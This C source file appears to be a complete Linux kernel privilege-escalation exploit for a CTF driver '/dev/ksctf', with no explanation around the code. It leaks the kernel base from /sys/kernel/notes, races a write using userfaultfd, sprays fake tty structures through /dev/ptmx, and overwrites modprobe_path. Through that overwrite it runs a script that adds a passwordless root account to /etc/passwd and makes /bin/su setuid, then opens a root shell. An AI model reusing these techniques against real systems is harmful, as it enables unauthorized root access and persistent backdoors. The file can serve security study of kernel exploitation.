#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>

#include <linux/btrfs.h>
#include <linux/capability.h>
#include <linux/sysctl.h>
#include <linux/types.h>
#include <linux/userfaultfd.h>

#include "tty.h"
#include "userfault.h"

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;

u8 WAIT()
{
    write(STDERR_FILENO, "[WAITING...]\n", 13);
    u8 c;
    read(STDIN_FILENO, &c, 1);
    return c;
}

static inline void panic(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

void getShell()
{
    if (getuid())
    {
        panic("NO ROOT");
    }
    logOK("Rooted!");
    char *argv[] = {"/bin/sh", NULL};
    char **envp = &argv[1];
    execve(argv[0], argv, envp);
}

void save_state()
{
    __asm__(
        "mov [rip + user_cs], cs\n"
        "mov [rip + user_ss], ss\n"
        "mov [rip + user_sp], rsp\n"
        "mov [rip + user_ip], %0\n"
        "pushf\n"
        "pop qword ptr [rip + user_rflags]\n" ::"r"(getShell));
    logInfo("Saved user state");
}

void pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        panic("sched_setaffinity");
    }
}

#define DEVFILE "/dev/ksctf"

int devfd;

struct Req
{
    char hash[32];
    int check;
    char *ptr;
};

u64 kbase;
void *leak = NULL;
int fds[100];

int stage;

void leakBase()
{
    int fd = open("/sys/kernel/notes", O_RDONLY);
    if (fd < 0)
    {
        panic("open(/sys/kernel/notes)");
    }

    char buf[0x000001d0];

    read(fd, buf, sizeof buf);
    kbase = *(u64 *)&buf[0x84] - 0x19e1180;
    logInfo("kBase @ 0x%lx", kbase);
    close(fd);
}

void worker()
{
    if (stage == 0)
    {
        struct Req req = {0};
        req.hash[0] = '\x41';
        req.check = 0x1;
        ioctl(devfd, 0xFFF1, &req);

        for (uint i = 0; i < 50; ++i)
        {
            fds[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
            if (fds[i] < 0)
            {
                panic("open(/dev/ptmx)");
            }
        }
    }
    stage++;
}

int main(int argc, char **argv, char **envp)
{
    pin_cpu(0);

    leakBase();

    devfd = open(DEVFILE, O_RDWR);
    if (devfd < 0)
    {
        panic("open devfile");
    }

    struct Req req = {0};
    req.hash[0] = '\x41';
    req.check = 0x1;

    req.ptr = &leak;

    ioctl(devfd, 0xFFF0, &req);
    logInfo("%p", leak);

    createThreadUserFault(0x1337000, 1, worker);
    uint64_t *fakeTTY = &uf_buffer[0];
    fakeTTY[0] = 0x100005401;
    fakeTTY[1] = 0;
    fakeTTY[2] = leak;
    fakeTTY[3] = leak + 0x28 - offsetof(struct tty_operations, ioctl);
    fakeTTY[4] = 0x33;
    fakeTTY[5] = kbase + 0xed716;

    write(devfd, (void *)(0x1337000), 0x30);

    uint32_t *_ = "/tmp/vjp";

    for (uint i = 0; i < 50; ++i)
    {
        ioctl(fds[i], _[0], kbase + 0x14493c0);
        ioctl(fds[i], _[1], kbase + 0x14493c0 + 4);
        ioctl(fds[i], 0, kbase + 0x14493c0 + 8);
    }

    system("echo -e \""
           "#!/bin/sh\n"
           "echo 'vjp::0:0:root:/:/bin/sh' >> /etc/passwd\n"
           "/bin/chmod +s /bin/su\n"
           "\" > /tmp/vjp");
    chmod("/tmp/vjp", 0777);
    system("echo -e '\x13\x37\x42\x42' > /tmp/pwn");
    chmod("/tmp/pwn", 0777);
    system("/tmp/pwn"); // trigger call modprobe_path
    system("grep vjp /etc/passwd");
    system("su vjp");
}